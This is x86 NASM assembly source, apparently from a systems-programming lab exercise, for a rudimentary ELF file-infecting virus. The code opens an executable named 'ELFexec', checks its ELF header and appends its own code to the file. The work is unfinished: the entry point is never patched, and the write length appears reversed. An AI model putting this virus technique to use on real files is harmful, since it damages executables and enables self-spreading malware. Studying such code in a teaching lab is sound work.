%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8

	global _start

	section .text



_start:	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage


; You code for this lab goes here

	write 1,OutStr,15 ;print This is a virus to stdout
	open FileName,RDWR,0
	mov ebx,eax
	cmp dword eax,-1
	je ErrorExit
	mov esi,esp
	add esp,4
	read eax,esi,4
	cmp byte [esi+0], 0x7f
	jne ErrorExit
	cmp byte [esi+1], 'E'
	jne ErrorExit
	cmp byte [esi+2], 'L'
	jne ErrorExit
	cmp byte [esi+3], 'F'
	jne ErrorExit
	lseek ebx,0,SEEK_END
	write ebx,_start,_start-virus_end
	lseek ebx,0,SEEK_SET
	close ebx

VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)

ErrorExit:
			exit 1 ; exit if there is an error

FileName:	db "ELFexec", 0
OutStr:		db "This is a virus", 10, 0
Failstr:        db "perhaps not", 10 , 0

PreviousEntryPoint: dd VirusExit
virus_end:
